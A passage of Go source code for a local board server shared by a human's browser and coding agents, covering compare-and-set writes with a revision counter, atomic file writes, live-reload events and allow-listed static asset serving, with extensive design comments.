	live := &liveDoc{doc: doc, disk: raw, etag: etagOf(raw), stamp: stamp}
	s.live.Store(live)
	return live, nil
}

// getState answers from the cache, with an ETag, so a client that already holds
// this version gets a 304 and no body at all.
//
// It used to re-read the file per request and say `Cache-Control: no-store`,
// which forbids a client from even keeping a copy to revalidate — so the
// browser's post-SSE refetch transferred the whole document every time, including
// the reloads where nothing about it had changed. `no-cache` is the honest
// header: keep it, and ask every time whether it is still current.
func (s *server) getState(w http.ResponseWriter, r *http.Request) {
	live, err := s.cachedState()
	if err != nil {
		http.Error(w, "cannot read state", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("ETag", live.etag)
	if r.Header.Get("If-None-Match") == live.etag {
		w.WriteHeader(http.StatusNotModified)
		return
	}
	_, _ = w.Write(live.disk)
}

func (s *server) postState(w http.ResponseWriter, r *http.Request) {
	raw, err := io.ReadAll(http.MaxBytesReader(w, r.Body, maxBodyBytes))
	if err != nil {
		s.writeJSON(w, http.StatusBadRequest, map[string]string{wireError: "body too large or unreadable"})
		return
	}

	// ONE decode of the body, and the only one this request makes. Everything
	// that follows — the compare-and-set check, the guarantees, the id
	// reconciliation, the change summary — takes the parsed document; the
	// document already on disk is not decoded at all unless its bytes moved.
	incoming, err := decodeDocument(raw)
	if err != nil {
		if errors.Is(err, errTabsNotArray) {
			s.writeJSON(w, http.StatusBadRequest, map[string]string{wireError: "expected a tabs array"})
			return
		}
		// The parser is encoding/json/v2, which is stricter than the one this
		// server used to run: a duplicate object name and invalid UTF-8 are now
		// refused rather than silently resolved last-wins or replaced with U+FFFD.
		// The reason is carried through verbatim because it names the member and
		// the offset, and the caller is an agent that can fix it — a bare "invalid
		// json" on a 4 MB document is a message that sends somebody to a diff.
		s.writeJSON(w, http.StatusBadRequest, map[string]string{
			wireError:  "invalid json",
			wireReason: err.Error(),
		})
		return
	}
	if !incoming.hasTabs {
		s.writeJSON(w, http.StatusBadRequest, map[string]string{wireError: "expected a tabs array"})
		return
	}

	origin := rawString(incoming.fields["__origin"])
	if origin == "" {
		origin = "browser"
	}
	base, baseOK := baseTokenRaw(incoming.fields["__base"])
	if !baseOK {
		// A `__base` that is present but not a token is refused rather than
		// ignored. Ignoring it is the whole defect this token exists to close:
		// the caller believes it asked for compare-and-set, the server silently
		// did not, and the 200 says the write was fine.
		s.writeJSON(w, http.StatusBadRequest, map[string]string{
			wireError:  "invalid __base",
			wireReason: "__base must be the `rev` of the document you read, as a number or its decimal string",
		})
		return
	}
	// An ABSENT __by is "unknown", NOT "human".
	//
	// It used to default to "human", and "human" is not a label here — it is the
	// key every guarantee in tabs.go keys off. A write stamped human may delete
	// tabs, clear the change markers that tell the human something happened, and
	// drop chat acks. So a bare POST with no __by at all — a curl, a script, a
	// half-written tool — was handed all three: one request could empty the board
	// and leave no dot, no removal request and no trace that anything had been
	// hidden.
	//
	// The browser always sends it explicitly (aboard.html's pushDoc builds
	// `{ ...doc, __origin, __base, __by: 'human' }`), and `aboard apply --by
	// human` is refused outright, so nothing that legitimately holds human powers
	// relies on the default. Which means the default's only remaining job is to
	// name a caller that did not say who it was — and the safe answer to that is
	// an agent-level one.
	by := rawString(incoming.fields["__by"])
	if by == "" {
		by = actorUnknown
	}
	// Why this write is happening, in the caller's own words. Stripped here beside
	// __by and __base because it is about the WRITE and not about the board: a
	// label that reached the document would be a root key no renderer reads, and
	// the next writer would copy it forward as if it were theirs.
	label := clampLabel(rawString(incoming.fields["__label"]))
	delete(incoming.fields, "__origin")
	delete(incoming.fields, "__base")
	delete(incoming.fields, "__by")
	delete(incoming.fields, "__label")

	res, bad := s.commitState(incoming, base, by, origin, label)
	if bad != nil {
		s.writeJSON(w, bad.code, bad.body)
		return
	}

	// Publishing happens OUTSIDE the write lock, and the ordering is the reason:
	// the journal entry is on disk before any of this runs, so a watcher that
	// reacts instantly cannot arrive before the record of what it is reacting to.
	// Releasing a waiter can also fan out to every open page, and none of that
	// wants the next writer queued behind it.
	if len(res.entry.Tabs) > 0 {
		s.notifyWatchers(res.entry)
		if released := s.waits.releaseMatching(res.doc, res.entry); released > 0 {
			s.opts.Log().Printf("released %d waiting session(s) on: %s", released, joinOr(res.entry.Tabs, "no tab"))
			s.broadcastWaiters()
		}
	}

	reply := map[string]any{wireOK: true, keyRev: res.rev, keyUpdatedAt: res.stamp}
	// The warnings go back to whoever made the write, which for a browser write is
	// the only actor who can see them at all — the shell has no stderr. Omitted
	// when there are none, so a clean write's reply is the shape it always was.
	if len(res.entry.Warnings) > 0 {
		reply["warnings"] = res.entry.Warnings
	}
	// Which tabs the checks RAN over. A clean tab is absent from `warnings`, and
	// absent is not the same answer as "not checked": a page showing a warning
	// has to know that this write looked at that tab and found nothing, or it
	// keeps a banner about a mistake somebody has already fixed.
	if len(res.entry.Tabs) > 0 {
		reply["checked"] = res.entry.Tabs
	}
	s.writeJSON(w, http.StatusOK, reply)
}

// maxLabelRunes bounds a write label. It is navigation — one line in `aboard
// journal` — and the journal is a rotating file this server appends to on every
// write, so an unbounded string from a caller is a way to fill it with one POST.
// Truncated rather than refused: the CONTENT of the write was fine, which is the
// same trade `version` gets.
const maxLabelRunes = 200

func clampLabel(label string) string {
	label = strings.TrimSpace(label)
	// Newlines would break the one-line-per-entry shape `aboard journal` prints.
	label = strings.Join(strings.Fields(label), " ")
	if runes := []rune(label); len(runes) > maxLabelRunes {
		return strings.TrimSpace(string(runes[:maxLabelRunes])) + "…"
	}
	return label
}

// commitResult is what an accepted write hands back to the unlocked half of
// postState: the document as it reached disk, the one change summary its three
// consumers share, and the stamp the caller is told about.
type commitResult struct {
	doc   []byte
	entry JournalEntry
	stamp string
	rev   int
}

// apiError is a refusal the caller still has to write. The locked half returns
// one rather than writing the reply itself, so the write lock is never held
// while talking to a client.
type apiError struct {
	code int
	body map[string]string
}

// commitState is read → compare-and-set → reconcile → write, as ONE critical
// section.
//
// It used to be none: the file was read, the CAS compared, the tabs reconciled
// and the result renamed into place with no mutual exclusion at all, so two
// overlapping POSTs both read the same `updatedAt`, both passed the check, and
// both wrote — 40 of 40 barrier-synchronised trials returned two 200s with one
// edit gone from disk, and the journal recorded the lost write as if it had
// landed. Compare-and-set cannot work across a window it does not cover: the
// comparison and the write have to be indivisible or the comparison is advice.
//
// This lock only covers THIS process. Two servers on one state file would still
// race, which is why `aboard serve` refuses a duplicate rather than trusting the
// file, and why `apply` posts to the running board instead of writing the file
// itself — every writer that matters arrives through this function.
func (s *server) commitState(incoming *stateDoc, base, by, origin, label string) (commitResult, *apiError) {
	s.writeMu.Lock()
	defer s.writeMu.Unlock()

	live, err := s.currentLocked()
	if err != nil {
		return commitResult{}, &apiError{http.StatusBadRequest, map[string]string{wireError: err.Error()}}
	}
	current := live.doc

	// Compare-and-set against the REVISION, not the clock. See revision.
	if base != "" && len(live.disk) > 0 {
		if bad := current.rev.refuse(base); bad != nil {
			return commitResult{}, bad
		}
		// Only for a base that really is a timestamp: a legacy document can also
		// be written against a numeric base of 0, and calling that a timestamp
		// would be a wrong sentence in the log of the one case nobody can re-run.
		if _, notANumber := strconv.Atoi(strings.TrimSpace(base)); current.rev.legacy() && notANumber != nil {
			s.opts.Log().Printf("accepted a timestamp __base on a document with no rev — "+
				"this board has not been written since the revision token landed; %q gets rev %d", by, current.rev.rev+1)
		}
	}

	// Tab-level guarantees: an agent may not delete a tab or clear a change
	// marker, and every tab it did change gets stamped so the UI can show a dot.
	// One pass, and it also records which tabs changed — which is what the
	// journal summary below reads instead of comparing everything a second time.
	plan := reconcileDoc(current, incoming, by, s.opts.Log())

	next := &stateDoc{
		fields:  incoming.fields,
		tabs:    plan.tabs,
		byID:    make(map[string]int, len(plan.tabs)),
		hasTabs: true,
	}
	for i := range next.tabs {
		next.byID[next.tabs[i].ID] = i
	}
	next.nextID, _ = rawInt(next.fields[keyNextID])

	// Ids are board-wide monotonic; never let the counter regress or fall behind
	// the ids already in use (see ids.go). Only the tabs this write changed are
	// walked: every other tab carries the answer it had.
	nextID := nextIDFrom(next, current)

	// The schema version is ours to state, not the caller's. This server writes
	// version-3 documents by definition — it IS the v3 server — so a `version` in
	// the submitted body is at best a copy of what was read and at worst a copy of
	// a stale example. It used to be written through verbatim, and an agent that
	// copied "version": 2 out of the skill's own schema.md got `applied`, exit 0,
	// and a board that blanked itself in front of the human one round trip later:
	// aboard.html refuses to render a document whose version it does not know. The
	// agent found out last, from the human, which is exactly backwards.
	//
	// Stamped rather than refused, for the same reason nextId is reconciled rather
	// than rejected: the CONTENT was fine, and failing a good write over a field
	// the caller should never have set is the worse trade. The agent is still told
	// — Apply warns on stderr (see wrongVersion) — so the stale source gets
	// fixed by whoever is still holding the context for it.
	//
	// The compare-and-set token is server-managed for a sharper reason: `updatedAt`
	// was the token, and it is a millisecond clock — 4 collisions in 60 sequential
	// writes, and every collision is a provably stale base that passes. A counter
	// cannot collide, and the loser of a race is told a number it can compare
	// rather than a timestamp it has to trust.
	rev := current.rev.rev + 1
	stamp := time.Now().UTC().Format("2006-01-02T15:04:05.000Z")
	for _, f := range []struct {
		name  string
		value any
	}{
		{keyNextID, nextID},
		{keyVersion, SchemaVersion},
		{keyRev, rev},
		{keyUpdatedAt, stamp},
		{keyLastEditedBy, by},
	} {
		if err := next.setField(f.name, f.value); err != nil {
			return commitResult{}, &apiError{http.StatusInternalServerError, map[string]string{wireError: "encode failed"}}
		}
	}
	next.nextID = nextID
	next.rev = revision{rev: rev, had: true, updatedAt: stamp}

	out, err := next.marshalIndent()
	if err != nil {
		return commitResult{}, &apiError{http.StatusInternalServerError, map[string]string{wireError: "encode failed"}}
	}
	out = append(out, '\n')

	// One comparison, three consumers: the journal on disk, the watch stream,
	// and any session blocked on a predicate about this very change. The
	// comparison itself was made by reconcileDoc; this only reads the answer.
	entry := summarise(current, next.tabs, by, origin)
	entry.Label = label

	// The revision this write produces, on the record of it. `aboard history` and
	// the 409 merge both ask "which tabs moved since rev N", and a timestamp
	// cannot answer that — see JournalEntry.Rev.
	entry.Rev = rev

	// The write warnings, over the tabs this write actually TOUCHED and no others.
	// Scoped, not whole-document: `apply` checks everything the caller submitted
	// because the caller submitted everything, but here the write is one edit, and
	// a whole-board scan would re-report every pre-existing mistake on the board
	// as though this write had made it. The example board's deliberately invalid
	// `sparkline` is the case that settles it — unscoped, it would ride along on
	// every write anyone ever made, and a warning that always fires is one people
	// learn to skip. It still warns on a write that touches ITS tab, which is
	// correct and is not to be suppressed.
	//
	// Computed inside the lock so the journal entry is complete before it is
	// appended: the record of a write and the warnings about it are one fact.
	entry.Warnings = changedTabWarnings(s.specs(), next.tabs)

	if err := s.writeAtomic(out); err != nil {
		return commitResult{}, &apiError{http.StatusInternalServerError, map[string]string{wireError: "write failed"}}
	}

	// The document just written IS the current document — parsed, hashed and id-
	// counted already. Publishing it here is what makes the next write cost the
	// next edit rather than the whole board again.
	// The stamp is only believed when it describes the bytes we just wrote: if
	// something renamed over the file between our own rename and this stat, the
	// stat is somebody else's and caching our bytes under it would pin them.
	// An unusable stamp costs the next reader a re-read and cannot lie.
	info, _ := os.Stat(s.stateFile)
	written := stampOf(info)
	if written.size != int64(len(out)) {
		written = fileStamp{}
	}
	s.live.Store(&liveDoc{doc: next, disk: out, etag: etagOf(out), stamp: written})

	s.mu.Lock()
	s.pendingOrigin = origin
	s.pendingWarnings = entry.Warnings
	s.pendingChecked = entry.Tabs
	s.mu.Unlock()

	// The journal append stays inside the lock with the write it records. Outside
	// it, two writers could rename in one order and append in the other, and the
	// journal is the record a session reads to reconstruct what happened — an
	// order it invented would be worse than no record at all.
	if len(entry.Tabs) > 0 {
		s.journal.append(entry)
	}

	return commitResult{doc: out, entry: entry, stamp: stamp, rev: rev}, nil
}

// revision is the board's compare-and-set token as it stands on disk: a counter
// the server increments on every accepted write.
//
// `updatedAt` used to be the token, and a millisecond timestamp is not one. Two
// writes inside the same millisecond produce the same string, so a base built
// from the first one still matches after the second landed — measured at 4
// collisions in 60 sequential writes, after which a provably stale base passes
// the check and the human's edit is gone with a 200 to say it went well. The
// clock also runs backwards (NTP, a suspend, a container clock), which the
// comparison has no way to notice.
//
// A counter has neither problem, and it is comparable and cheap to print, which
// the hash alternative (stateSignature, already computed for the SSE frames) is
// not: sha256 would have been equally correct as an equality token, but "your
// base is rev 12, the board is at rev 14" tells a reader they are two writes
// behind, and "9f3a… != c17b…" tells them nothing.
//
// `updatedAt` stays, unchanged, because it answers a different question — WHEN,
// for a human reading the file — and nothing keys off it any more.
type revision struct {
	rev int
	// had reports whether the document on disk carried a `rev` at all. A board
	// written before this landed has none, and its stored `updatedAt` is the only
	// base its readers could have. See refuse.
	had       bool
	updatedAt string
}

// baseToken reads `__base` off the incoming document, and reports whether the
// value is one a comparison can be made from.
//
// It takes a NUMBER as readily as a string, and that is the point rather than a
// convenience. `rev` is a JSON number in the document, so the obvious thing for a
// caller assembling a write by hand is `"__base": doc.rev` — and until this
// existed the string type assertion failed, the base came out empty, and the
// server skipped compare-and-set altogether and answered 200. That is precisely
// the silent-clobber the revision token was introduced to end, one JSON type
// away, and it was reachable only AFTER the token stopped being a string.
//
// Absent or null is "no base", which is still an unconditional write and still
// legitimate (`apply --force`, a seeding script). Anything else — a bool, an
// object, a fractional number — is a caller that meant to set a base and got it
// wrong, and it is refused rather than quietly downgraded.
func baseToken(v any) (string, bool) {
	switch got := v.(type) {
	case nil:
		return "", true
	case string:
		return got, true
	case float64:
		if got != math.Trunc(got) {
			return "", false
		}
		return strconv.FormatInt(int64(got), 10), true
	default:
		return "", false
	}
}

// revisionFromFields reads the token off a document already parsed. It used to
// be revisionOf, which unmarshalled the whole state file into a map[string]any to
// find two keys — one of the seven full-document decodes a POST made.
// baseTokenRaw is baseToken over the raw field, since the document is no longer
// decoded into a map of `any`.
func baseTokenRaw(raw jsontext.Value) (string, bool) {
	if len(raw) == 0 {
		return "", true
	}
	var v any
	if jsonv2.Unmarshal(raw, &v) != nil {
		return "", false
	}
	return baseToken(v)
}

func revisionFromFields(fields map[string]jsontext.Value) revision {
	got := revision{}
	got.updatedAt = rawString(fields[keyUpdatedAt])
	if n, ok := rawInt(fields[keyRev]); ok {
		got.rev, got.had = n, true
	}
	return got
}

// legacy reports that the live document predates the revision token.
func (v revision) legacy() bool { return !v.had }

// refuse decides whether a submitted __base may write over this document, and
// returns the refusal when it may not.
//
// Two shapes of base arrive. A number is a revision and is compared as one. A
// non-numeric string is a timestamp from before this change, and it is accepted
// ONLY while the live document has no `rev` of its own — that is a board whose
// last write predates the upgrade, whose readers cannot have a revision to send,
// and which gets one on this very write. Once a `rev` is on disk a timestamp base
// is refused outright, because accepting it would reopen the same-millisecond
// hole for every writer that kept sending the old field.
func (v revision) refuse(base string) *apiError {
	if n, err := strconv.Atoi(strings.TrimSpace(base)); err == nil {
		if n == v.rev {
			return nil
		}
		return &apiError{http.StatusConflict, map[string]string{
			wireError:  "conflict",
			"live":     strconv.Itoa(v.rev),
			"base":     base,
			wireReason: fmt.Sprintf("your base is rev %d and the board is at rev %d — re-read the document, redo the edit, apply again", n, v.rev),
		}}
	}
	if v.legacy() && base == v.updatedAt {
		return nil
	}
	return &apiError{http.StatusConflict, map[string]string{
		wireError:  "conflict",
		"live":     strconv.Itoa(v.rev),
		"base":     base,
		wireReason: "__base must be the `rev` of the document you read; a timestamp is the old token and is no longer compared",
	}}
}

// Write via a temp file in the same directory, then rename. A reader (Claude
// Code, or another browser) therefore never observes a half-written file.
//
// THE MODE IS PART OF THE CONTRACT, and this got it wrong for as long as it
// used os.CreateTemp: that creates at 0600 and the rename carries the mode with
// it, so the state file `aboard init` wrote at 0644 silently dropped to 0600 on
// the server's first accepted write. The board's whole purpose is to be read by
// the tools the developer already runs — their editor, a VS Code extension,
// every other agent session — and 0600 is the mode for a service holding other
// people's secrets, which this is not (see the file-mode note in init.go).
//
// Two rules, in this order:
//
//   - A file that already exists keeps ITS mode. If somebody chose 0600 for
//     their own board, an ordinary write is not the place to overrule them.
//   - A new file is created 0o644 THROUGH THE UMASK, by asking the kernel for
//     that mode rather than chmod-ing afterwards. os.OpenFile applies the umask;
//     os.Chmod does not, and would hand a 0077 user a world-readable file they
//     had explicitly asked not to have. This is also why there is no
//     syscall.Umask call here: that is Unix-only, and this tree cross-compiles
//     for Windows.
func (s *server) writeAtomic(body []byte) error {
	mode := os.FileMode(0o644)
	if info, err := os.Stat(s.stateFile); err == nil {
		mode = info.Mode().Perm()
	}

	tmp, err := createTempFile(s.stateFile, mode)
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	defer func() { _ = os.Remove(tmpName) }()

	if _, err := tmp.Write(body); err != nil {
		_ = tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	return os.Rename(tmpName, s.stateFile)
}

// createTempFile is os.CreateTemp with a mode, which os.CreateTemp does not
// take — it is hard-wired to 0600. O_EXCL makes the name race-free exactly as
// CreateTemp's own loop does; the mode goes through the umask because the kernel
// applies it to O_CREATE.
func createTempFile(dest string, mode os.FileMode) (*os.File, error) {
	var lastErr error
	for range 100 {
		// math/rand, not crypto/rand, and deliberately: O_EXCL is what makes the
		// name safe, exactly as it is in os.CreateTemp's own loop. The number only
		// has to avoid a collision with a concurrent write in the same directory,
		// and the loop below handles the collision if it happens.
		name := TempFileBeside(dest, rand.Uint64()) //nolint:gosec // G404: O_EXCL provides the safety; this only avoids a retry
		f, err := os.OpenFile(name, os.O_RDWR|os.O_CREATE|os.O_EXCL, mode)
		if err == nil {
			return f, nil
		}
		if !os.IsExist(err) {
			return nil, err
		}
		lastErr = err
	}
	return nil, lastErr
}

/* ---------- live reload ---------- */

func (s *server) events(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.WriteHeader(http.StatusOK)
	_, _ = io.WriteString(w, "retry: 1000\n\n")

	// Hand every client the signature of the UI it should be running, before
	// anything else. This is what makes a restart self-healing: the browser
	// reconnects on its own, sees a signature that differs from the code it
	// loaded, and reloads itself (see reload.go).
	if payload := s.uiPayload(); payload != "" {
		_, _ = fmt.Fprintf(w, "data: %s\n\n", payload)
	}
	flusher.Flush()

	ch := make(chan string, 8)
	s.mu.Lock()
	s.clients[ch] = struct{}{}
	s.mu.Unlock()

	defer func() {
		s.mu.Lock()
		delete(s.clients, ch)
		close(ch)
		s.mu.Unlock()
	}()

	for {
		select {
		case <-r.Context().Done():
			return
		case msg := <-ch:
			if _, err := fmt.Fprintf(w, "data: %s\n\n", msg); err != nil {
				return
			}
			flusher.Flush()
		}
	}
}

// guard runs one of the long-lived background goroutines so a panic inside it is
// reported through Options.Logger instead of taking the process down.
//
// Defence in depth, not the fix: nothing in the fanout path panics any more (see
// fanout). But these two are the only goroutines in the server with no HTTP
// handler above them — net/http recovers a panicking handler and keeps serving,
// while a bare `go f()` that panics ends the process — and the board dying is the
// worst failure this program has: the human's page goes blank, every session
// blocked on `wait` is released with nothing, and the instance file survives to
// point the next command at a port nobody is listening on.
//
// It does not restart the goroutine. A poll loop that panicked once will panic
// again on the next tick, and a silent restart loop is how a bug becomes a log
// nobody reads.
func (s *server) guard(name string, fn func()) {
	defer func() {
		if r := recover(); r != nil {
			s.opts.Log().Printf("panic in the %s, which has stopped: %v\n%s", name, r, debug.Stack())
		}
	}()
	fn()
}

// Poll rather than use an OS watcher: it keeps the dependency list short, and
// unlike a single-file watch it cannot be defeated by an editor replacing the
// file, which a rename-based save does.
func (s *server) watch() {
	var lastSig string
	for {
		time.Sleep(200 * time.Millisecond)
		sig := s.stateSignature()
		if sig == "" || sig == lastSig {
			continue
		}
		if lastSig != "" {
			s.broadcast()
		}
		lastSig = sig
	}
}

// stateSignature is one watcher tick: what the board spends, five times a
// second, on a document nobody is writing to.
//
// The comment here used to say "size plus mtime catches everything a normal
// write does. Hash the content only when mtime resolution could hide a fast
// successive write" — and the code below it read and SHA-256'd the whole file
// unconditionally, every tick. On a 10 MB board that is ~50 MB/s of sustained
// reading and hashing to discover, fifty times in a row, that nothing happened.
//
// So the gate the comment described now exists: stat, and hash only when the
// size or the modification time has moved. The signature stays a CONTENT hash
// rather than becoming the stat itself, because a save that rewrites identical
// bytes must not wake every open page — and a rename-based save moves mtime
// whether or not anything changed.
//
// What this cannot see: a foreign write of exactly the same length inside one
// mtime tick. That is a gap in the notification, not in the data — the write
// path never trusts a stat (see currentLocked), and the next real change pings.
func (s *server) stateSignature() string {
	info, err := os.Stat(s.stateFile)
	if err != nil {
		return ""
	}
	stamp := stampOf(info)
	if s.sig != "" && s.sigStamp == stamp {
		return s.sig
	}
	body, err := os.ReadFile(s.stateFile)
	if err != nil {
		s.sig, s.sigStamp = fmt.Sprintf("%d-%d", stamp.size, stamp.mtime), stamp
		return s.sig
	}
	sum := sha256.Sum256(body)
	s.sig, s.sigStamp = hex.EncodeToString(sum[:16]), stamp
	return s.sig
}

func (s *server) broadcast() {
	s.mu.Lock()
	origin := s.pendingOrigin
	warnings := s.pendingWarnings
	checked := s.pendingChecked
	s.pendingOrigin = ""
	s.pendingWarnings = nil
	s.pendingChecked = nil
	payload := `{"origin":null}`
	if origin != "" || len(warnings) > 0 || len(checked) > 0 {
		frame := map[string]any{"origin": nil}
		if origin != "" {
			frame["origin"] = origin
		}
		// Carried on the change frame rather than fetched: the page already
		// re-reads the document on this ping, and a second round trip to /journal
		// would read the whole journal file — both generations — five times a
		// second's worth of writes, to surface a sentence.
		if len(warnings) > 0 {
			frame["warnings"] = warnings
		}
		// And the tabs the checks ran over, so a page can take DOWN a warning the
		// next write cleared. A frame carrying only warnings can raise a banner
		// and never lower one.
		if len(checked) > 0 {
			frame["checked"] = checked
		}
		if b, err := json.Marshal(frame); err == nil {
			payload = string(b)
		}
	}
	s.mu.Unlock()

	s.fanout(payload)
}

// fanout pushes one SSE payload to every open page. Shared by the state watcher
// and by the waiter count (wait.go), which the notify button listens for.
//
// The sends happen UNDER the lock, and that is the fix for a race that killed the
// process outright. It used to copy the channels, release the lock, then send —
// and `events` unsubscribes by deleting its channel from the map AND closing it,
// so a client that hung up inside that window had its channel closed before the
// send arrived, and a send on a closed channel panics. `watch()` is a bare
// goroutine with no handler above it, so the whole server died and `aboard
// status` reported a stale record for a board that had been fine a moment ago.
//
// Under the lock rather than "delete without closing", which would also have
// worked: the alternative makes correctness depend on nobody, ever, closing a
// subscriber channel — an invariant spread across two files, enforced by nothing,
// and reinstated by the next person who reads `close(ch)` as tidy. Here the rule
// is local and visible at the site that has to obey it. It costs nothing:
// every send is already non-blocking, so a wedged client cannot hold the lock,
// and the critical section is a bounded walk over a handful of channels with no
// I/O in it.
func (s *server) fanout(payload string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for ch := range s.clients {
		select {
		case ch <- payload:
		default: // a wedged client must not stall the watcher
		}
	}
}

/* ---------- static ---------- */

func (s *server) static(w http.ResponseWriter, r *http.Request, upath string) {
	name := strings.TrimPrefix(path.Clean("/"+upath), "/")
	if name == "" || strings.Contains(name, "..") {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}

	allowed := false
	for _, f := range serveFiles {
		if name == f {
			allowed = true
		}
	}
	for _, d := range serveDirs {
		if strings.HasPrefix(name, d+"/") {
			allowed = true
		}
	}
	if !allowed {
		http.Error(w, "forbidden", http.StatusForbidden)
		return
	}
	body, err := fs.ReadFile(s.assets, name)
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	s.writeAsset(w, r, name, body)
}

// basePlaceholder is the line aboard.html ships with, and the only thing the
// template step touches. A marker rather than a template engine: the shell is
// 56 KB of hand-written HTML and the fewer things that rewrite it, the fewer
// ways it can be rewritten wrongly.
const basePlaceholder = `window.ABOARD_BASE = "";`

// serveShell serves aboard.html with the base path injected, so every URL the
// page builds — fetches, the SSE stream, an html tab's iframe — is prefixed
// exactly the way the router expects to receive it.
func (s *server) serveShell(w http.ResponseWriter, r *http.Request) {
	body, err := fs.ReadFile(s.assets, "aboard.html")
	if err != nil {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	want := []byte(basePlaceholder)
	if !bytes.Contains(body, want) {
		// Loud, because the page would otherwise come up looking fine and fail
		// only under a base path, in a console nobody has open.
		s.opts.Log().Printf("warning: aboard.html has no %s marker — the base path cannot be injected", basePlaceholder)
	} else if s.base != "" {
		body = bytes.Replace(body, want,
			[]byte(`window.ABOARD_BASE = "`+s.base+`";`), 1)
	}
	s.writeAsset(w, r, "aboard.html", body)
}

// writeAsset sends one asset with the caching rules that suit how it can change.
// The ETag is computed over the bytes actually sent, not the file on disk, so a
// templated shell served under two different base paths does not answer the
// second request from the first one's cache.
func (s *server) writeAsset(w http.ResponseWriter, r *http.Request, name string, body []byte) {
	if typ := mime.TypeByExtension(path.Ext(name)); typ != "" {
		w.Header().Set("Content-Type", typ)
	}
	// nosniff, on every asset. The declared type is right for each of them, and
	// this is what makes that declaration binding: without it a browser is free
	// to sniff a file whose extension mime knows nothing about and decide it is
	// HTML. Nothing here is user content — see the note on the Write below — but
	// "the type we said" and "the type it is treated as" being the same thing is
	// what makes that argument checkable rather than a promise about a directory
	// listing.
	w.Header().Set("X-Content-Type-Options", "nosniff")

	// Embedded assets cannot change without a rebuild, so let the browser keep
	// them — this is what stops the 3.5 MB mermaid bundle being refetched on
	// every reload. In dev mode the files are being edited, so never cache.
	if s.dev {
		w.Header().Set("Cache-Control", "no-store")
	} else {
		sum := sha256.Sum256(body)
		etag := `"` + hex.EncodeToString(sum[:8]) + `"`
		w.Header().Set("ETag", etag)
		w.Header().Set("Cache-Control", "no-cache")
		if r.Header.Get("If-None-Match") == etag {
			w.WriteHeader(http.StatusNotModified)
			return
		}
	}
	// gosec reports G705 (XSS via taint analysis) here, because the REQUEST chose
	// which asset to send: static() takes the path out of the URL, so `body` is
	// derived from user input as far as the analysis can see.
	//
	// It chose the file; it did not write the bytes. The name is matched against
	// serveFiles/serveDirs — an allow-list of literals — before anything is read,
	// and it is read from s.assets, which is the //go:embed tree compiled into
	// this binary (or, under --dev, the developer's own checkout). There is no
	// path by which a request contributes a byte of the response body. The one
	// value that IS interpolated into an asset is s.base, in serveShell, and
	// ValidateBasePath has already refused anything outside
	// `(/[A-Za-z0-9._~-]+)+` — no quote, no angle bracket, nothing that can leave
	// the JS string literal it lands in.
	//
	// The type is declared and pinned with nosniff above, so a .js or .css asset
	// cannot be re-read as a document either.
	_, _ = w.Write(body) //nolint:gosec // G705: the request picks WHICH embedded asset, never its contents; see the paragraph above
}

// writeJSON is a METHOD, and that is the whole reason it changed shape: the one
// line it logs went to the standard logger, which a host embedding this tree has
// no way to redirect. Every caller was already a *server, so the receiver costs
// nothing and closes the last hole in "server logging goes through
// Options.Logger" (aboard.go).
func (s *server) writeJSON(w http.ResponseWriter, code int, payload any) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(code)
	if err := json.NewEncoder(w).Encode(payload); err != nil {
		// The status line is already on the wire, so there is no code left to
		// change and the client sees a truncated body. Log it: a handler that
		// cannot serialise its own reply is a bug, and silence is how it stays
		// one.
		s.opts.Log().Printf("writeJSON: encoding a %d reply: %v", code, err)
	}
}
